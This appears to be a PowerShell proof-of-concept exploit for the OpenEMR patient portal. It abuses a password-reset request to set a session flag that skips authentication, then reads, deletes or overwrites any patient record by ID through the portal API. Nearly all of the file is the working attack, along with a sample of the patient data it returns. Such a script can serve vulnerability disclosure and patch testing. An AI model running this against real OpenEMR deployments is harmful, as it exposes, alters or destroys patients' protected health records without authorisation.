#################################################################################################################
#  Author: Chris Patterson                                                                                      #
#  Date: 2022-01-01                                                                                             #
#  Purpose: Identify vulnerability in OpenEMR patient portal where an attacker can obtain, change or delete     #
#           a specified patient record by specifying the ID, first and last name, or email.                     #
#  CVE ID:                                                                                                      #
#                                                                                                               #
#################################################################################################################

#Set proxy if needed (Fiddler users http://localhost:8888)
$proxy = $null #"http://localhost:8888"

#Store the start time of the script to provide running time at the end of the script
$startTime = Get-Date

#Clear any existing patient ID
$id = $null

#Initialize a counter for the number of requests to the server for reporting
$requestCount = 0

#Get the server fqdn if it was not already provided in the PowerShell session
if (!$fqdn) {
    $fqdn = Read-Host -Prompt "Enter the fqdn of the OpenEMR Instance (https://demo.openemr.io/openemr)"
}

#Start a session by requesting a password reset without logging in
#This activates the error handling logic in index.php which sets $_SESSION['register']=true
#when register session variable is true, authentication is bypassed for the patient portal API
$null = Invoke-WebRequest -URI "$fqdn/portal/index.php?requestNew=true" -SessionVariable 'session' -Proxy $proxy

#Increment the request counter
$requestCount++

#Alternatively, if the self registration function is enabled, we can start that session to achieve
#the same result of a register session variable set to true.
#$null = Invoke-WebRequest -URI "$fqdn/portal/account/register.php" -SessionVariable 'session'

#Exit the script if unable to establish a session
if (!$session) {
    Write-Host "A session could not be established.  Check the connection settings."
    exit
}

#At this point we can make a valid patient portal API call

#Obtain a patient ID from the user to retrieve
$id = Read-Host "Enter Patient ID"
if ($id) {
    if ((Read-Host "Get Patient Info? (y|n)") -eq "y") {
        #[GET]api/patient/(:num) --Download a Patient Record in json format (format at end of script)
        $response = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient/$id" -Method 'Get' -WebSession $session -Proxy $proxy
	  
	  #Display patient information on the screen
        ConvertFrom-Json $response.Content | Format-List

	  #Increment the request count
        $requestCount++

        Write-Host ""
        Write-Host "Patient information Retrieved"
    } elseif ((Read-Host "Delete Patient? (y|n)") -eq "y") {   
        #[DELETE]api/patient/(:num) --Delete a Patient Record
        $response = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient/$id" -Method 'DELETE' -WebSession $session -Proxy $proxy
        
	  #Increment the request count
	  $requestCount++

        Write-Host ""
        Write-Host "Patient deleted"
    } elseif ((Read-Host "Update a Patient? (y|n") -eq "y") {
	  #If updating we need to create a valid JSON body with patient information
	  #Read values from the user to create the JSON body
        $body = @{
            "note"= $null
            "id"= $id
            "title"= ""
            "language"= ""
            "financial"= $null
            "fname"= "$(Read-Host "First Name")"
            "lname"= "$(Read-Host "Last Name")"
            "mname"= ""
            "dob"= "$(Read-Host "Date of Birth")"
            "street"= ""
            "postalCode"= ""
            "city"= ""
            "state"= ""
            "countryCode"= ""
            "driversLicense"= $null
            "ss"= ""
            "occupation"= $null
            "phoneHome"= ""
            "phoneBiz"= ""
            "phoneContact"= ""
            "phoneCell"= ""
            "pharmacyId"= 0
            "status"= ""
            "contactRelationship"= ""
            "date"= "$(Get-Date)"
            "sex"= "Male"
            "referrer"= $null
            "referrerid"= $null
            "providerid"= "1"
            "refProviderid"= 0
            "email"= "$(Read-Host "Email Address")"
            "emailDirect"= "$(Read-Host "Email Direct Address")"
            "ethnoracial"= $null
            "race"= ""
            "ethnicity"= ""
            "religion"= ""
            "familySize"= ""
            "pubpid"= "$id"
            "pid"= "$id"
            "hipaaMail"= ""
            "hipaaVoice"= ""
            "hipaaNotice"= ""
            "hipaaMessage"= ""
            "hipaaAllowsms"= ""
            "hipaaAllowemail"= "YES"
            "regdate"= "$((Get-Date).ToString("yy-MM-dd"))"
            "mothersname"= ""
            "guardiansname"= ""
            "allowImmRegUse"= ""
            "allowImmInfoShare"= ""
            "allowHealthInfoEx"= ""
            "allowPatientPortal"= "YES"
            "careTeam"= 0
            "county"= ""
        }
            
        #[PUT]api/patient/(:num) --Update a Patient Record
        $response = Invoke-WebRequest -URI "$fqdn/portal/patient/api/patient/$id" -Method 'PUT' -Body (ConvertTo-JSON $body) -WebSession $session -Proxy $proxy
        
	  #Increment the request count
	  $requestCount++

	  Display returned result from the server
        ConvertFrom-Json $response.Content | Format-List    
        Write-Host ""
        Write-Host "Patient information Updated"
    }
}


Write-Host "Time Elapsed $(((Get-Date)-$startTime)), $requestCount requests were made."
Write-Host ""

<#
Expected sample return from #[GET]api/patient/(:num)
{
  "validationErrors": [],
  "error_description": [],
  "data": {
    "id": "193",
    "pid": "1",
    "pubpid": "",
    "title": "Mr",
    "fname": "Baz",
    "mname": "",
    "lname": "Bop",
    "ss": "",
    "street": "456 Tree Lane",
    "postal_code": "08642",
    "city": "FooTown",
    "state": "FL",
    "county": "",
    "country_code": "US",
    "drivers_license": "",
    "contact_relationship": "",
    "phone_contact": "123-456-7890",
    "phone_home": "",
    "phone_biz": "",
    "phone_cell": "",
    "email": "",
    "DOB": "1992-02-03",
    "sex": "Male",
    "race": "",
    "ethnicity": "",
    "status": ""
  }
}
#>